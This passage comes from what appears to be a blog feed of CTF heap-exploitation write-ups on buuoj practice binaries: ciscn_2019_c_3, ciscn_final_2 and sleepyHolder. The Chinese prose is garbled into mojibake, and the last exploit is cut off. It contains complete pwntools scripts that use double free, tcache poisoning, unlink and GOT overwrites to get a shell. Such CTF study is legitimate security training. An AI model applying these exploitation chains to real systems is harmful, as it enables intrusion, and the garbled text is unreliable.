†ï¼Œè¿™é‡Œä¸å¤ªæ˜ç™½ä¸ºä»€ä¹ˆè¦ç”¨free_hook-0x10çš„åœ°å€ï¼Œè€Œä¸æ˜¯free_hook"></a>å†ç”³è¯·ä¸€ä¸ªå †ï¼Œè¿™æ—¶å€™ä¼šåœ¨å †2å¼€å§‹,ç”±äºglibc 2.27çš„ç‰¹æ€§ï¼Œä¼šåœ¨å¼€å§‹çš„ä¸Šæ–¹ç”³è¯·å †ï¼Œè¿™é‡Œä¸å¤ªæ˜ç™½ä¸ºä»€ä¹ˆè¦ç”¨free_hook-0x10çš„åœ°å€ï¼Œè€Œä¸æ˜¯free_hook</h5><pre><code class="lang-py">payload=p64(0)*2+p64(free_hook-0x10)add(0x60,payload) #2</code></pre><p><img src="https://i.imgs.ovh/2023/11/27/pnGZ0.png" alt="image-20231127221735133"></p><h5 id="double-freeç„¶åç”¨backdoorå‡½æ•°20æ¬¡ï¼Œfd-0x20-å°†binæŒ‡é’ˆæŒ‡å‘0x0000562a77ab5280çš„åœ°å€"><a href="#double-freeç„¶åç”¨backdoorå‡½æ•°20æ¬¡ï¼Œfd-0x20-å°†binæŒ‡é’ˆæŒ‡å‘0x0000562a77ab5280çš„åœ°å€" class="headerlink" title="double freeç„¶åç”¨backdoorå‡½æ•°20æ¬¡ï¼Œfd+0x20,å°†binæŒ‡é’ˆæŒ‡å‘0x0000562a77ab5280çš„åœ°å€"></a>double freeç„¶åç”¨backdoorå‡½æ•°20æ¬¡ï¼Œfd+0x20,å°†binæŒ‡é’ˆæŒ‡å‘0x0000562a77ab5280çš„åœ°å€</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnNKC.png" alt="image-20231127221921315"></p><p><img src="https://i.imgs.ovh/2023/11/27/pnajt.png" alt="image-20231127222235671"></p><pre><code class="lang-py">add(0x60,&#39;aaaa&#39;)add(0x60,&#39;bbbb&#39;)add(0x60,p64(gadget))delete(1)</code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,29798)p=process(&quot;./ciscn_2019_c_3&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)context.arch=&#39;amd64&#39;one_gadget=0x4f322def add(size,content):    p.sendlineafter(&#39;Command: &#39;,&#39;1&#39;)    p.sendlineafter(&#39;size: &#39;,str(size))    p.sendlineafter(&#39;Give me the name: &#39;,content)def show(index):    p.sendlineafter(&#39;Command: &#39;,&#39;2&#39;)    p.sendlineafter(&#39;index: &#39;,str(index))def delete(index):    p.sendlineafter(&#39;Command: &#39;,&#39;3&#39;)    p.sendlineafter(&#39;weapon:&#39;,str(index))def back(index):    p.sendlineafter(&#39;Command: &#39;,&#39;666&#39;)    p.sendlineafter(&#39;weapon:&#39;,str(index))add(0x100,&#39;aaaa&#39;) #0add(0x60,&#39;bbbb&#39;) #1for i in range(8):    delete(0)show(0)p.recvuntil(&quot;attack_times: &quot;)#arena = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))arena_96=int(p.recvuntil(&#39;\n&#39;,drop=True))malloc_hook=arena_96-96-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]gadget=base+one_gadgetpayload=p64(0)*2+p64(free_hook-0x10)#2add(0x60,payload)delete(2)delete(2)for i in range(0x20):    back(2)gdb.attach(p)sleep(1)add(0x60,&#39;aaaa&#39;)add(0x60,&#39;bbbb&#39;)print(hex(free_hook))add(0x60,p64(gadget))delete(1)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_final_2</title>
      <link href="/2023/11/02/ciscn-final-2/"/>
      <url>/2023/11/02/ciscn-final-2/</url>
      
        <content type="html"><![CDATA[<h5 id="ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå°±ä¸æ”¾äº†ã€‚"><a href="#ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå°±ä¸æ”¾äº†ã€‚" class="headerlink" title="ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå°±ä¸æ”¾äº†ã€‚"></a>ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå°±ä¸æ”¾äº†ã€‚</h5><h5 id="addå‡½æ•°ï¼Œåªèƒ½ç”³è¯·0x20å¤§å°çš„å †æˆ–è€…0x10å¤§å°çš„ï¼Œåªèƒ½å…ˆç”³è¯·å†é‡Šæ”¾"><a href="#addå‡½æ•°ï¼Œåªèƒ½ç”³è¯·0x20å¤§å°çš„å †æˆ–è€…0x10å¤§å°çš„ï¼Œåªèƒ½å…ˆç”³è¯·å†é‡Šæ”¾" class="headerlink" title="addå‡½æ•°ï¼Œåªèƒ½ç”³è¯·0x20å¤§å°çš„å †æˆ–è€…0x10å¤§å°çš„ï¼Œåªèƒ½å…ˆç”³è¯·å†é‡Šæ”¾"></a>addå‡½æ•°ï¼Œåªèƒ½ç”³è¯·0x20å¤§å°çš„å †æˆ–è€…0x10å¤§å°çš„ï¼Œåªèƒ½å…ˆç”³è¯·å†é‡Šæ”¾</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZX3dv.png" alt="image-20231102221044737"></p><h5 id="å­˜åœ¨double-freeæ¼æ´"><a href="#å­˜åœ¨double-freeæ¼æ´" class="headerlink" title="å­˜åœ¨double freeæ¼æ´"></a>å­˜åœ¨double freeæ¼æ´</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXmFe.png" alt="image-20231102221330585"></p><h5 id="å¯ä»¥double-freeæ³„éœ²å‡ºå †åœ°å€ï¼Œä½†æ˜¯æ˜¯intç±»å‹ï¼Œæ¥æ”¶çš„è¯ç”¨addr-int-p-recvuntil-â€˜-nâ€™-drop-True-å‘é€çš„æ—¶å€™ç”¨strç±»å‹å°±å¯åœ¨å†…å­˜é‡Œç”¨åå…­è¿›åˆ¶å­˜å‚¨äº†ã€‚"><a href="#å¯ä»¥double-freeæ³„éœ²å‡ºå †åœ°å€ï¼Œä½†æ˜¯æ˜¯intç±»å‹ï¼Œæ¥æ”¶çš„è¯ç”¨addr-int-p-recvuntil-â€˜-nâ€™-drop-True-å‘é€çš„æ—¶å€™ç”¨strç±»å‹å°±å¯åœ¨å†…å­˜é‡Œç”¨åå…­è¿›åˆ¶å­˜å‚¨äº†ã€‚" class="headerlink" title="å¯ä»¥double freeæ³„éœ²å‡ºå †åœ°å€ï¼Œä½†æ˜¯æ˜¯intç±»å‹ï¼Œæ¥æ”¶çš„è¯ç”¨addr=int(p.recvuntil(â€˜\nâ€™, drop=True)),å‘é€çš„æ—¶å€™ç”¨strç±»å‹å°±å¯åœ¨å†…å­˜é‡Œç”¨åå…­è¿›åˆ¶å­˜å‚¨äº†ã€‚"></a>å¯ä»¥double freeæ³„éœ²å‡ºå †åœ°å€ï¼Œä½†æ˜¯æ˜¯intç±»å‹ï¼Œæ¥æ”¶çš„è¯ç”¨addr=int(p.recvuntil(â€˜\nâ€™, drop=True)),å‘é€çš„æ—¶å€™ç”¨strç±»å‹å°±å¯åœ¨å†…å­˜é‡Œç”¨åå…­è¿›åˆ¶å­˜å‚¨äº†ã€‚</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXwuW.png" alt="image-20231102221416344"></p><h5 id="å‰æˆæ˜¯å…ˆdouble-freeæ”¹å †å¤´çš„sizeï¼Œæ”¹sizeå®¹æ˜“ä½†æ˜¯ä¸­é—´å¾—addå¥½å‡ ä¸ªå †"><a href="#å‰æˆæ˜¯å…ˆdouble-freeæ”¹å †å¤´çš„sizeï¼Œæ”¹sizeå®¹æ˜“ä½†æ˜¯ä¸­é—´å¾—addå¥½å‡ ä¸ªå †" class="headerlink" title="å‰æˆæ˜¯å…ˆdouble freeæ”¹å †å¤´çš„sizeï¼Œæ”¹sizeå®¹æ˜“ä½†æ˜¯ä¸­é—´å¾—addå¥½å‡ ä¸ªå †"></a>å‰æˆæ˜¯å…ˆdouble freeæ”¹å †å¤´çš„sizeï¼Œæ”¹sizeå®¹æ˜“ä½†æ˜¯ä¸­é—´å¾—addå¥½å‡ ä¸ªå †</h5><pre><code class="lang-py">add(1,&#39;11&#39;)dele(1)add(2,&#39;22&#39;)add(2,&#39;11&#39;)add(2,&#39;11&#39;)add(2,&#39;22&#39;)dele(2)add(1,&#39;11&#39;)dele(2)show(2)p.recvuntil(&#39;your short type inode number :&#39;)addr=int(p.recvuntil(&#39;\n&#39;, drop=True))-0xa0add(2,addr)add(2,&#39;11&#39;)add(2,0x91) #æ”¹æ‰size</code></pre><p><img src="https://i0.imgs.ovh/2023/11/02/ZXhGo.png" alt="image-20231102222318910"></p><h5 id="free7æ¬¡ä½¿å…¶è¿›å…¥unsortedbin-å‰é¢æ”¹sizeæˆ0x90æ˜¯æœ€å°çš„å¤§å°ï¼Œä¸ç„¶ä¸‹é¢çš„åœ°å€ä¸ä¼šæ˜¯main-arena-96"><a href="#free7æ¬¡ä½¿å…¶è¿›å…¥unsortedbin-å‰é¢æ”¹sizeæˆ0x90æ˜¯æœ€å°çš„å¤§å°ï¼Œä¸ç„¶ä¸‹é¢çš„åœ°å€ä¸ä¼šæ˜¯main-arena-96" class="headerlink" title="free7æ¬¡ä½¿å…¶è¿›å…¥unsortedbin,å‰é¢æ”¹sizeæˆ0x90æ˜¯æœ€å°çš„å¤§å°ï¼Œä¸ç„¶ä¸‹é¢çš„åœ°å€ä¸ä¼šæ˜¯main_arena+96"></a>free7æ¬¡ä½¿å…¶è¿›å…¥unsortedbin,å‰é¢æ”¹sizeæˆ0x90æ˜¯æœ€å°çš„å¤§å°ï¼Œä¸ç„¶ä¸‹é¢çš„åœ°å€ä¸ä¼šæ˜¯main_arena+96</h5><pre><code class="lang-py">for i in range(7):    dele(1)    add(2,5)dele(1)</code></pre><p><img src="https://i0.imgs.ovh/2023/11/02/ZXKu5.png" alt="image-20231102223102271"></p><h5 id="æ¥æ”¶å¹¶è®¡ç®—åœ°å€-è‡³äºä¸ºä»€ä¹ˆæ˜¯-IO-2-1-stdin-0x70ï¼Œåº”è¯¥æ˜¯å®ƒæ‰§è¡Œæ—¶å€™çš„åœ°å€ã€‚"><a href="#æ¥æ”¶å¹¶è®¡ç®—åœ°å€-è‡³äºä¸ºä»€ä¹ˆæ˜¯-IO-2-1-stdin-0x70ï¼Œåº”è¯¥æ˜¯å®ƒæ‰§è¡Œæ—¶å€™çš„åœ°å€ã€‚" class="headerlink" title="æ¥æ”¶å¹¶è®¡ç®—åœ°å€,è‡³äºä¸ºä»€ä¹ˆæ˜¯ IO_2_1_stdin +0x70ï¼Œåº”è¯¥æ˜¯å®ƒæ‰§è¡Œæ—¶å€™çš„åœ°å€ã€‚"></a>æ¥æ”¶å¹¶è®¡ç®—åœ°å€,è‡³äºä¸ºä»€ä¹ˆæ˜¯ <em>IO_2_1_stdin </em>+0x70ï¼Œåº”è¯¥æ˜¯å®ƒæ‰§è¡Œæ—¶å€™çš„åœ°å€ã€‚</h5><pre><code class="lang-py">show(1)p.recvuntil(&#39;your int type inode number :&#39;)malloc_hook=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x70base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70</code></pre><h5 id="å†æ¬¡mallocæ”¹æ‰å †åœ°å€-ç„¶åå¡«å……"><a href="#å†æ¬¡mallocæ”¹æ‰å †åœ°å€-ç„¶åå¡«å……" class="headerlink" title="å†æ¬¡mallocæ”¹æ‰å †åœ°å€,ç„¶åå¡«å……"></a>å†æ¬¡mallocæ”¹æ‰å †åœ°å€,ç„¶åå¡«å……</h5><pre><code class="lang-py">add(1,stdin)add(1,0x30)</code></pre><p><img src="https://i0.imgs.ovh/2023/11/02/ZXSAX.png" alt="image-20231102223851495"></p><h5 id="å†æ¬¡double-freeè·å–å¤´åœ°å€ï¼Œå†æ¬¡showå‡ºæ¥çš„å †å¤´åœ°å€å’Œå¼€å§‹æ—¶çš„æ—¶ä¸ä¸€æ ·çš„ã€‚"><a href="#å†æ¬¡double-freeè·å–å¤´åœ°å€ï¼Œå†æ¬¡showå‡ºæ¥çš„å †å¤´åœ°å€å’Œå¼€å§‹æ—¶çš„æ—¶ä¸ä¸€æ ·çš„ã€‚" class="headerlink" title="å†æ¬¡double freeè·å–å¤´åœ°å€ï¼Œå†æ¬¡showå‡ºæ¥çš„å †å¤´åœ°å€å’Œå¼€å§‹æ—¶çš„æ—¶ä¸ä¸€æ ·çš„ã€‚"></a>å†æ¬¡double freeè·å–å¤´åœ°å€ï¼Œå†æ¬¡showå‡ºæ¥çš„å †å¤´åœ°å€å’Œå¼€å§‹æ—¶çš„æ—¶ä¸ä¸€æ ·çš„ã€‚</h5><pre><code class="lang-py">dele(1)add(2,0x30)dele(1) #double freeshow(1)p.recvuntil(&#39;your int type inode number :&#39;)chunk0=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x30</code></pre><p><img src="https://i0.imgs.ovh/2023/11/02/ZXRWt.png" alt="image-20231102224535159"></p><h5 id="å†æ”¹å †æŒ‡é’ˆ-å¡«å……"><a href="#å†æ”¹å †æŒ‡é’ˆ-å¡«å……" class="headerlink" title="å†æ”¹å †æŒ‡é’ˆ,å¡«å……"></a>å†æ”¹å †æŒ‡é’ˆ,å¡«å……</h5><pre><code class="lang-py">add(1,chunk0)add(1,chunk0)add(1,111)add(1,666)</code></pre><p><img src="https://i0.imgs.ovh/2023/11/02/ZXcgm.png" alt="image-20231102224934035"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *from LibcSearcher import *p=process(&#39;./ciscn_final_2&#39;)#p=remote(&#39;node4.buuoj.cn&#39;,26681)context( os = &#39;linux&#39;,arch=&#39;amd64&#39;)context.log_level = &#39;debug&#39;elf=ELF(&#39;./ciscn_final_2&#39;)libc=ELF(&#39;./libc-2.27.so&#39;)def add(index,content):    p.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;)    p.sendlineafter(&#39;&gt;&#39;,str(index))    p.sendlineafter(&#39;your inode number:&#39;,str(content))def dele(index):    p.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;)    p.sendlineafter(&#39;&gt;&#39;,str(index))def show(index):    p.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;)    p.sendlineafter(&#39;&gt;&#39;,str(index))add(1,&#39;11&#39;)dele(1)add(2,&#39;22&#39;)add(2,&#39;11&#39;)add(2,&#39;11&#39;)add(2,&#39;22&#39;)dele(2)add(1,&#39;11&#39;)dele(2)show(2)p.recvuntil(&#39;your short type inode number :&#39;)addr=int(p.recvuntil(&#39;\n&#39;, drop=True))-0xa0add(2,addr)add(2,&#39;11&#39;)add(2,0x91)for i in range(7):    dele(1)    add(2,5)dele(1)show(1)p.recvuntil(&#39;your int type inode number :&#39;)malloc_hook=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x70base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70add(1,stdin)  ###???add(1,0x30)#double freedele(1)add(2,0x30)dele(1)show(1)p.recvuntil(&#39;your int type inode number :&#39;)chunk0=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x30add(1,chunk0)gdb.attach(p)sleep(1)add(1,chunk0)add(1,111)add(1,666)p.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)p.recvuntil(&#39;your message :&#39;)#print(addr)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sleepyHolder_hitcon_2016</title>
      <link href="/2023/10/30/sleepyHolder-hitcon-2016/"/>
      <url>/2023/10/30/sleepyHolder-hitcon-2016/</url>
      
        <content type="html"><![CDATA[<h5 id="ä¾‹è¡Œæ£€æŸ¥"><a href="#ä¾‹è¡Œæ£€æŸ¥" class="headerlink" title="ä¾‹è¡Œæ£€æŸ¥"></a>ä¾‹è¡Œæ£€æŸ¥</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AS5sW.png" alt=""></p><h5 id="addå‡½æ•°ï¼Œèƒ½åˆ†åˆ«ç”³è¯·ä¸€ä¸ª0x28ï¼Œ0xfa0-0x61a80å¤§å°çš„å †ä¸€æ¬¡"><a href="#addå‡½æ•°ï¼Œèƒ½åˆ†åˆ«ç”³è¯·ä¸€ä¸ª0x28ï¼Œ0xfa0-0x61a80å¤§å°çš„å †ä¸€æ¬¡" class="headerlink" title="addå‡½æ•°ï¼Œèƒ½åˆ†åˆ«ç”³è¯·ä¸€ä¸ª0x28ï¼Œ0xfa0,0x61a80å¤§å°çš„å †ä¸€æ¬¡"></a>addå‡½æ•°ï¼Œèƒ½åˆ†åˆ«ç”³è¯·ä¸€ä¸ª0x28ï¼Œ0xfa0,0x61a80å¤§å°çš„å †ä¸€æ¬¡</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASi8V.png" alt="image-20231031212602644"></p><h5 id="deleå‡½æ•°ï¼Œå­˜åœ¨UAFæ¼æ´ï¼ŒæŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œä½†æ˜¯å¯¹åº”çš„æ•°æ¸…é›¶äº†ï¼Œæ‰€ä»¥å¯ä»¥å†æ¬¡ç”³è¯·å †"><a href="#deleå‡½æ•°ï¼Œå­˜åœ¨UAFæ¼æ´ï¼ŒæŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œä½†æ˜¯å¯¹åº”çš„æ•°æ¸…é›¶äº†ï¼Œæ‰€ä»¥å¯ä»¥å†æ¬¡ç”³è¯·å †" class="headerlink" title="deleå‡½æ•°ï¼Œå­˜åœ¨UAFæ¼æ´ï¼ŒæŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œä½†æ˜¯å¯¹åº”çš„æ•°æ¸…é›¶äº†ï¼Œæ‰€ä»¥å¯ä»¥å†æ¬¡ç”³è¯·å †"></a>deleå‡½æ•°ï¼Œå­˜åœ¨UAFæ¼æ´ï¼ŒæŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œä½†æ˜¯å¯¹åº”çš„æ•°æ¸…é›¶äº†ï¼Œæ‰€ä»¥å¯ä»¥å†æ¬¡ç”³è¯·å †</h5><p><img src="https://i0.imgs.ovh/2023/10/30/AfdAt.png" alt="image-20231030201715281"></p><h5 id="è¿™è¿˜æœ‰ä¸ªeditå‡½æ•°"><a href="#è¿™è¿˜æœ‰ä¸ªeditå‡½æ•°" class="headerlink" title="è¿™è¿˜æœ‰ä¸ªeditå‡½æ•°"></a>è¿™è¿˜æœ‰ä¸ªeditå‡½æ•°</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASteK.png" alt="image-20231030204040558"></p><pre><code class="lang-py">add(1,&#39;AAAA&#39;) #å †0add(2,&#39;BBBB&#39;) #å †1dele(1)add(3,&#39;cccc&#39;) #å †2</code></pre><h5 id="å› ä¸ºå †2å¤ªå¤§æ‰€ä»¥free-chunkä¼šæ”¾åœ¨smallbiné‡Œ"><a href="#å› ä¸ºå †2å¤ªå¤§æ‰€ä»¥free-chunkä¼šæ”¾åœ¨smallbiné‡Œ" class="headerlink" title="å› ä¸ºå †2å¤ªå¤§æ‰€ä»¥free chunkä¼šæ”¾åœ¨smallbiné‡Œ"></a>å› ä¸ºå †2å¤ªå¤§æ‰€ä»¥free chunkä¼šæ”¾åœ¨smallbiné‡Œ</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Ah5hd.png" alt="image-20231031172733305"></p><h5 id="è¿™é‡Œæœ‰ä¸ªæ¼æ´ï¼Œdouble-freeå †0åå†æ¬¡ç”³è¯·å †0ï¼Œå †1çš„sizeä½è¿˜æ˜¯0ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨unlink"><a href="#è¿™é‡Œæœ‰ä¸ªæ¼æ´ï¼Œdouble-freeå †0åå†æ¬¡ç”³è¯·å †0ï¼Œå †1çš„sizeä½è¿˜æ˜¯0ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨unlink" class="headerlink" title="è¿™é‡Œæœ‰ä¸ªæ¼æ´ï¼Œdouble freeå †0åå†æ¬¡ç”³è¯·å †0ï¼Œå †1çš„sizeä½è¿˜æ˜¯0ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨unlink"></a>è¿™é‡Œæœ‰ä¸ªæ¼æ´ï¼Œdouble freeå †0åå†æ¬¡ç”³è¯·å †0ï¼Œå †1çš„sizeä½è¿˜æ˜¯0ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨unlink</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Asbk2.png" alt="image-20231031173201803"></p><h5 id="å†ç”³è¯·ä¸€æ¬¡å †"><a href="#å†ç”³è¯·ä¸€æ¬¡å †" class="headerlink" title="å†ç”³è¯·ä¸€æ¬¡å †"></a>å†ç”³è¯·ä¸€æ¬¡å †</h5><pre><code class="lang-py">add(1,&#39;aaaa&#39;)</code></pre><p><img src="https://i0.imgs.ovh/2023/10/31/ASOFp.png" alt="image-20231030220449382"></p><h5 id="åé¢æ„é€ fake-chunk-ç„¶ådele-2-ä¼šunlink"><a href="#åé¢æ„é€ fake-chunk-ç„¶ådele-2-ä¼šunlink" class="headerlink" title="åé¢æ„é€ fake_chunk,ç„¶ådele(2),ä¼šunlink"></a>åé¢æ„é€ fake_chunk,ç„¶ådele(2),ä¼šunlink</h5><pre><code class="lang-py">payload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)edit(1,payload)dele(2) #unlink</code></pre><p><img src="https://i0.imgs.ovh/2023/10/31/As5D5.png" alt="image-20231031173510102"></p><h5 id="æ³¨æ„å †0æ—¶0x6020d0-å †1æ—¶0x6020c0ï¼Œåˆšå¼€å§‹ä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆåé¢è¦è¡¥è¿™ä¹ˆå¤š1ï¼Œåé¢çœ‹å‘addå‡½æ•°ï¼Œå †0ï¼Œ1ï¼Œ2åˆ†åˆ«å¯¹åº”ç€0x6020e0-d8-dcçš„åœ°å€-æœ‰åˆ™è¡¨ç¤º1-å †1è™½å·²deleï¼Œä½†æ˜¯åªæ˜¯ä¸ºäº†åé¢æ–¹ä¾¿æ”¹æŒ‡é’ˆï¼Œå…¨éƒ½å†™æˆ1"><a href="#æ³¨æ„å †0æ—¶0x6020d0-å †1æ—¶0x6020c0ï¼Œåˆšå¼€å§‹ä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆåé¢è¦è¡¥è¿™ä¹ˆå¤š1ï¼Œåé¢çœ‹å‘addå‡½æ•°ï¼Œå †0ï¼Œ1ï¼Œ2åˆ†åˆ«å¯¹åº”ç€0x6020e0-d8-dcçš„åœ°å€-æœ‰åˆ™è¡¨ç¤º1-å †1è™½å·²deleï¼Œä½†æ˜¯åªæ˜¯ä¸ºäº†åé¢æ–¹ä¾¿æ”¹æŒ‡é’ˆï¼Œå…¨éƒ½å†™æˆ1" class="headerlink" title="æ³¨æ„å †0æ—¶0x6020d0,å †1æ—¶0x6020c0ï¼Œåˆšå¼€å§‹ä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆåé¢è¦è¡¥è¿™ä¹ˆå¤š1ï¼Œåé¢çœ‹å‘addå‡½æ•°ï¼Œå †0ï¼Œ1ï¼Œ2åˆ†åˆ«å¯¹åº”ç€0x6020e0,d8,dcçš„åœ°å€,æœ‰åˆ™è¡¨ç¤º1,å †1è™½å·²deleï¼Œä½†æ˜¯åªæ˜¯ä¸ºäº†åé¢æ–¹ä¾¿æ”¹æŒ‡é’ˆï¼Œå…¨éƒ½å†™æˆ1"></a>æ³¨æ„å †0æ—¶0x6020d0,å †1æ—¶0x6020c0ï¼Œåˆšå¼€å§‹ä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆåé¢è¦è¡¥è¿™ä¹ˆå¤š1ï¼Œåé¢çœ‹å‘addå‡½æ•°ï¼Œå †0ï¼Œ1ï¼Œ2åˆ†åˆ«å¯¹åº”ç€0x6020e0,d8,dcçš„åœ°å€,æœ‰åˆ™è¡¨ç¤º1,å †1è™½å·²deleï¼Œä½†æ˜¯åªæ˜¯ä¸ºäº†åé¢æ–¹ä¾¿æ”¹æŒ‡é’ˆï¼Œå…¨éƒ½å†™æˆ1</h5><pre><code class="lang-py">payload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1)edit(1,payload)  #8</code></pre><p><img src="https://i0.imgs.ovh/2023/10/31/Axq5v.png" alt="image-20231031175111527"></p><pre><code>edit(2,p64(0x400760))  #put_pltedit(1,p64(0x602020))  #puts_got</code></pre><h5 id="æŠŠfree-gotæ”¹å†™çš„å†…å®¹æ”¹æˆputs-plt-å¯ä»¥æ‰§è¡Œputså‡½æ•°ï¼Œå †0çš„æŒ‡é’ˆå†™ä¸Šputs-got-ç„¶ådeleå †1ï¼Œå°±ä¼šæ‰“å°å‡ºåœ°å€"><a href="#æŠŠfree-gotæ”¹å†™çš„å†…å®¹æ”¹æˆputs-plt-å¯ä»¥æ‰§è¡Œputså‡½æ•°ï¼Œå †0çš„æŒ‡é’ˆå†™ä¸Šputs-got-ç„¶ådeleå †1ï¼Œå°±ä¼šæ‰“å°å‡ºåœ°å€" class="headerlink" title="æŠŠfree_gotæ”¹å†™çš„å†…å®¹æ”¹æˆputs_plt,å¯ä»¥æ‰§è¡Œputså‡½æ•°ï¼Œå †0çš„æŒ‡é’ˆå†™ä¸Šputs_got,ç„¶ådeleå †1ï¼Œå°±ä¼šæ‰“å°å‡ºåœ°å€"></a>æŠŠfree_gotæ”¹å†™çš„å†…å®¹æ”¹æˆputs_plt,å¯ä»¥æ‰§è¡Œputså‡½æ•°ï¼Œå †0çš„æŒ‡é’ˆå†™ä¸Šputs_got,ç„¶ådeleå †1ï¼Œå°±ä¼šæ‰“å°å‡ºåœ°å€</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AxaJ9.png" alt="image-20231031175406206"></p><h5 id="ç„¶åç®—å‡ºåç§»ï¼Œç®—å‡ºsystemå‡½æ•°çš„åœ°å€ï¼Œå†editå †0ï¼Œ0x6020c0"><a href="#ç„¶åç®—å‡ºåç§»ï¼Œç®—å‡ºsystemå‡½æ•°çš„åœ°å€ï¼Œå†editå †0ï¼Œ0x6020c0" class="headerlink" title="ç„¶åç®—å‡ºåç§»ï¼Œç®—å‡ºsystemå‡½æ•°çš„åœ°å€ï¼Œå†editå †0ï¼Œ0x6020c0"></a>ç„¶åç®—å‡ºåç§»ï¼Œç®—å‡ºsystemå‡½æ•°çš„åœ°å€ï¼Œå†editå †0ï¼Œ0x6020c0</h5><pre><code class="lang-py">payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1)edit(1,payload)</code></pre><p><img src="https://i0.imgs.ovh/2023/10/31/AKQhe.png" alt="image-20231031180043302"></p><h5 id="å†editå †2ï¼Œå†™ä¸Šsystemçš„åœ°å€ï¼Œ"><a href="#å†editå †2ï¼Œå†™ä¸Šsystemçš„åœ°å€ï¼Œ" class="headerlink" title="å†editå †2ï¼Œå†™ä¸Šsystemçš„åœ°å€ï¼Œ"></a>å†editå †2ï¼Œå†™ä¸Šsystemçš„åœ°å€ï¼Œ</h5><pre><code class="lang-py">edit(2,p64(system))</code></pre><p><img src="https://i0.imgs.ovh/2023/10/31/AKRU3.png" alt="image-20231031180248465"></p><h5 id="ä¸»å‡½æ•°èœå•é‚£é‡Œè¿˜æœ‰ä¸ªatoiå‡½æ•°ï¼Œå†™ä¸Šâ€™shâ€™å³å¯"><a href="#ä¸»å‡½æ•°èœå•é‚£é‡Œè¿˜æœ‰ä¸ªatoiå‡½æ•°ï¼Œå†™ä¸Šâ€™shâ€™å³å¯" class="headerlink" title="ä¸»å‡½æ•°èœå•é‚£é‡Œè¿˜æœ‰ä¸ªatoiå‡½æ•°ï¼Œå†™ä¸Šâ€™shâ€™å³å¯"></a>ä¸»å‡½æ•°èœå•é‚£é‡Œè¿˜æœ‰ä¸ªatoiå‡½æ•°ï¼Œå†™ä¸Šâ€™shâ€™å³å¯</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./sleepyHolder_hitcon_2016&quot;)context.log_level=&quot;debug&quot;context(arch=&#39;amd64&#39;)elf=ELF(&#39;./sleepyHolder_hitcon_2016&#39;)libc=ELF(&#39;libc-2.23.so&#39;)def add(chose,content):    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;1&#39;)    p.sendlineafter(&#39;What secret do you want to keep?&#39;,str(chose))    p.sendafter(&#39;Tell me your secret: &#39;,content)def dele(index):    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;2&#39;)    p.sendlineafter(&#39;Which Secret do you want to wipe?&#39;,str(index))def edit(ch,content):    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;3&#39;)    p.sendlineafter(&#39;Which Secret do you want to renew?&#39;,str(ch))    p.sendafter(&#39;Tell me your secret: &#39;,content)add(1,&#39;AAAA&#39;) add(2,&#39;BBBB&#39;) dele(1)add(3,&#39;cccc&#39;) dele(1)add(1,&#39;aaaa&#39;) 